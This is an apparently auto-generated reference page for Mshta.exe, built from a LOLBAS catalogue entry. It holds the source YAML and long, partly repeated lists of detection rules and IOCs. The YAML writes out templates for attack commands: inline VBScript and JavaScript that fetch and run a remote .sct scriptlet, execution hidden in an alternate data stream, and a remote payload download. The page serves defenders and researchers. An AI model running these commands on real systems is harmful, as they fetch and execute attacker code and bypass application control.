---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Mshta.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `mshta.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Mshta.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Mshta.exe](../../tools/windows/mshta.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | mshta.exe |
| name | Mshta.exe |
| type | tool |
| source | lolbas |
| url | https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@oddvarmoe'
  Person: Oddvar Moe
- Handle: '@C_h4ck_0'
  Person: Nir Chako (Pentera)
Author: Oddvar Moe
Code_Sample:
- Code: https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019
Commands:
- Category: Execute
  Command: mshta.exe {PATH:.hta}
  Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
  MitreID: T1218.005
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: HTA
  - Execute: Remote
  Usecase: Execute code
- Category: Execute
  Command: mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
  Description: Executes VBScript supplied as a command line argument.
  MitreID: T1218.005
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: VBScript
  Usecase: Execute code
- Category: Execute
  Command: mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
  Description: Executes JavaScript supplied as a command line argument.
  MitreID: T1218.005
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: JScript
  Usecase: Execute code
- Category: ADS
  Command: mshta.exe "{PATH_ABSOLUTE}:file.hta"
  Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
  MitreID: T1218.005
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
  Privileges: User
  Tags:
  - Execute: HTA
  Usecase: Execute code hidden in alternate data stream
- Category: Download
  Command: mshta.exe {REMOTEURL}
  Description: It will download a remote payload and place it in INetCache.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Downloads payload from remote server
Created: 2018-05-25
Description: Used by Windows to execute html applications. (.hta)
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml
- Elastic: https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- IOC: mshta.exe executing raw or obfuscated script within the command-line
- IOC: General usage of HTA file
- IOC: msthta.exe network connection to Internet/WWW resource
- IOC: DotNet CLR libraries loaded into mshta.exe
- IOC: DotNet CLR Usage Log - mshta.exe.log
Full_Path:
- Path: C:\Windows\System32\mshta.exe
- Path: C:\Windows\SysWOW64\mshta.exe
Name: Mshta.exe
Resources:
- Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
- Link: https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
- Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
- Link: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Mshta.yml
```

## Detection / Analysis Notes

```text
BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml
```

```text
IOC: DotNet CLR Usage Log - mshta.exe.log
```

```text
IOC: DotNet CLR libraries loaded into mshta.exe
```

```text
IOC: General usage of HTA file
```

```text
IOC: mshta.exe executing raw or obfuscated script within the command-line
```

```text
IOC: msthta.exe network connection to Internet/WWW resource
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml
```

```text
Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml
- Elastic: https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml
- Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- IOC: mshta.exe executing raw or obfuscated script within the command-line
- IOC: General usage of HTA file
- IOC: msthta.exe network connection to Internet/WWW resource
- IOC: DotNet CLR libraries loaded into mshta.exe
- IOC: DotNet CLR Usage Log - mshta.exe.log
```
